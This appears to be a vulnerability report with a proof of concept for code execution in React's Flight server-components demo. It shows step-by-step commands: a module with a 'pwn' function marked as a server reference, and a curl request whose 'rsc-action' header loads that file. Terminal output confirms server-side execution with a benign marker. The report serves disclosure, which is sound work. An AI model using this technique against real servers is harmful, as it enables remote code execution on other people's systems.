

his document outlines the steps to run the Flight demo and trigger the vulnerable path.

## Step 1: Start the Flight Demo

Open a terminal and start the Flight demo servers:

```bash
cd /path/to/react/fixtures/flight
yarn dev
```

This should start:
- Global server on localhost (port 3000)
- Regional server on localhost (port 3001)

## Step 2: Create a PoC Module

In a second terminal, create the proof-of-concept module:

```bash
cat > /tmp/rsc_poc.mjs <<'EOF'
export function pwn() {
  const marker =
    `SERVER_EXEC pid=${process.pid} node=${process.version} window=${typeof window}`;
  console.log(marker); // this prints in the server terminal, not the browser
  return marker;
}
// Satisfy the server's check in fixtures/flight/server/region.js:215
pwn.$$typeof = Symbol.for("react.server.reference");
EOF
```

## Step 3: Trigger the Vulnerable Path

In the same terminal as Step 2, execute the following curl command:

```bash
curl -sS 'http://localhost:3000/' \
  -X POST \
  -H 'Accept: text/x-component' \
  -H 'Content-Type: text/plain' \
  -H 'rsc-action: file:///tmp/rsc_poc.mjs#pwn' \
  --data '[]' | strings | grep -F 'SERVER_EXEC'
```


My terminal Output:
```bash

┌──(keshav㉿kali)-[~/Downloads/react/fixtures/flight]
└─$ cat > /tmp/rsc_poc.mjs <<'EOF'
export function pwn() {
  const marker =
    `SERVER_EXEC pid=${process.pid} node=${process.version} window=${typeof window}`;
  console.log(marker); // this prints in the server terminal, not the browser
  return marker;
}
// Satisfy the server's check in fixtures/flight/server/region.js:215
pwn.$$typeof = Symbol.for("react.server.reference");
EOF

                                                                                
┌──(keshav㉿kali)-[~/Downloads/react/fixtures/flight]
└─$ curl -sS 'http://localhost:3000/' \
  -X POST \
  -H 'Accept: text/x-component' \
  -H 'Content-Type: text/plain' \
  -H 'rsc-action: file:///tmp/rsc_poc.mjs#pwn' \
  --data '[]' | strings | grep -F 'SERVER_EXEC'

0:{"root":[[["$","link","static/css/main.76138ffd.css",{"rel":"stylesheet","href":"static/css/main.76138ffd.css","precedence":"default"},null,"$1",0]],"$L2"],"returnValue":"SERVER_EXEC pid=11016 node=v22.22.0 window=undefined","formState":null}


```
